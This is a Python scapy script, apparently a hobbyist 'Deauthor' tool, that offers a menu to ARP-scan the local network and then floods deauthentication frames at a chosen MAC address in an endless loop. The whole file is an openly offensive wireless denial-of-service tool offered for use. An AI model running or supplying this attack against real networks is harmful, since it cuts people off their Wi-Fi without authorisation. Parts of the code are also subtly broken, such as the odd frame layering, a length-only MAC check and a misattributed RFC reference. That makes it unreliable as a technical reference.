# Deauth tool written in scapy. 24/01/2024 
# Version 1.0


from scapy.all import *
import os
import time

global get_gateway

def clear_screen():
    operating_system = os.name
    if operating_system == 'nt':
        os.system('cls')
    else:
        os.system('clear')
 

def deauth():  
    def mac_addr():
        global mac_address

        # MAC address input to enter the MAC address of the users nominated choice. 
        
        mac_address = input('ENTERMAC: ')
        def_len = 'ff:ff:ff:ff:ff:ff'

        # error checking to ensure the MAC is correct syntactically and in line with RFC 7769
        
        if mac_address == '':
            print('This field cannot be empty.')
            time.sleep(2)
            return deauth()
        elif len(mac_address) == len(def_len):
            pass
        else:
            print('Incorrect format for MAC Address. ')
            time.sleep(2)
            return deauth()
        
    
    
    clear_screen()
    menu_of_items_Deauth = input('''
| ## Deauth ##
|
| 1, Enter MAC
| 2, START DEAUTH
| 3, BACK
|    
  >> ''')

    
    if menu_of_items_Deauth == '1':

        # calls mac_addr() to enter the mac address for the attack 
        
        mac_addr()
        print('MAC ADDRESS SET!')
        time.sleep(1)

        # clears the terminal and returns deauth() to either go back or start the attack. 
        
        clear_screen()
        return deauth()

    elif menu_of_items_Deauth == '2':

        # Gets the default gateway IP  
        
        get_gateway = conf.route.route('0.0.0.0')[2]

        # Returns the MAC by using ARP to retrieve the MAC using the IP. 
        
        mac_gateway = getmacbyip(get_gateway)
        confirmation = input('y/n to confirm: ')

        # starts the Deauthing attack against the MAC address. 
        
        if confirmation == 'y':
            while True:
                deauth_frame = RadioTap()/Ether(src=mac_gateway, dst=mac_address)/Dot11(subtype=12)
                sendp(deauth_frame)

        # else-IF the prompt is equal to n then just quit and return to the Deauth menu. 
        
        elif confirmation == 'n':
            return deauth()
        else:
            return deauth()

    # Return to the main menu    
     
    elif menu_of_items_Deauth == '3':
        return menu()

    # Return to
    
    else:
        clear_screen()
        return deauth()
        
    

def get_local_devices(get_gateway):  
    print('## Scanning network, hold Ctrl C to cancel. ##')
    print('')

    # Scans the network using the broadcast MAC address as the destination and returns IPs associated with the MAC addresses 
    
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=get_gateway), timeout=6)
    ans.summary(lambda s,r: r.sprintf("IP Address: %ARP.psrc% MAC Address: %Ether.src%"))
    time.sleep(2)
    print('')
    print('Network scan complete!')
    print('')
    menu_return = input('''
Would you like to rescan? n to return to menu.

y/n: ''')

    # IF y then restart the process, ELSEIF n then return to main menu.
    
    if menu_return == 'n':
        print('')
        print('Returning to menu...')
        time.sleep(1)
        return menu()
    elif menu_return == 'y':
        get_local_devices(get_gateway)  

def resolve_gateway():  
    global get_gateway

    # This function is called when the gateway IP requires resolving. 
        
    os.system('clear')
    get_gateway = conf.route.route('0.0.0.0')[2]
    get_local_devices(get_gateway)
    map(deauth, get_gateway)


def menu(): 

    # Menu of items, the users begins here. 
    
    clear_screen()

    men_u = input('''
| ## Deauthor | Made by cookpancakes ##
|
|    
| 1) Scan Network
| 2) Deauth Attack 
|
|
  
  
  >> ''')
    
    if men_u == '1':
        time.sleep(1)
        resolve_gateway()
    elif men_u == '2':
        time.sleep(1)
        deauth()        
    

menu()
